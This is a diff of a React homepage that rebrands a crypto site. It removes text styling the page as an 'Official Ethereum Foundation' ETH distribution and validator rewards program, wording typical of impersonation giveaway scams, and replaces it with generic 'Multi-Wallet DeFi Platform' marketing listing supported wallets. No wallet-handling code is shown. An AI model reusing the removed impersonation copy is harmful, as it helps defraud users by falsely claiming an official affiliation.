@@ -71,10 +71,10 @@ export default function Home() {
               <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10" />
               <div>
                 <h1 className="text-xl font-bold text-foreground">
-                  Ethereum Foundation
+                  Multi-Wallet DeFi Platform
                 </h1>
                 <p className="text-sm text-muted-foreground">
-                  Official ETH Distribution Program
+                  11+ Wallets | 7 Networks | Professional Management
                 </p>
               </div>
             </div>
@@ -123,19 +123,19 @@ export default function Home() {
             <div className="inline-flex items-center px-6 py-3 bg-gradient-to-r from-success/10 to-primary/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8 shadow-lg backdrop-blur-sm">
               <CheckCircle className="w-4 h-4 mr-3 text-success animate-pulse" />
               <span className="bg-gradient-to-r from-success to-primary bg-clip-text text-transparent font-semibold">
-                Official Ethereum Foundation Validator Rewards Program - Active Since 2022
+                Professional Multi-Wallet DeFi Platform - Supporting 11+ Wallets Since 2024
               </span>
             </div>
             
             {/* Main Title */}
             <h1 className="text-4xl md:text-6xl font-bold mb-6 leading-tight">
               <span className="bg-gradient-to-r from-foreground via-primary to-secondary bg-clip-text text-transparent">
-                Ethereum Foundation
+                Multi-Wallet DeFi Platform
               </span>
             </h1>
             <h2 className="text-2xl md:text-4xl font-semibold mb-8">
               <span className="bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent">
-                Validator Rewards Distribution
+                Professional Cryptocurrency Management
               </span>
             </h2>
             
@@ -150,8 +150,8 @@ export default function Home() {
                     className="w-full h-32 object-contain"
                   />
                 </div>
-                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Audited Smart Contracts</h3>
-                <p className="text-sm text-muted-foreground text-center leading-relaxed">Enterprise-grade security with multi-signature validation and formal verification protocols ensuring maximum fund protection</p>
+                <h3 className="text-lg font-bold mb-3 text-center text-foreground">11+ Wallet Support</h3>
+                <p className="text-sm text-muted-foreground text-center leading-relaxed">Professional support for MetaMask, Trust Wallet, Coinbase, Rainbow, Phantom, SafePal, Exodus, Ledger, Trezor and more with authentic SVG icons</p>
               </div>
 
               {/* Multi-Network Infrastructure */}
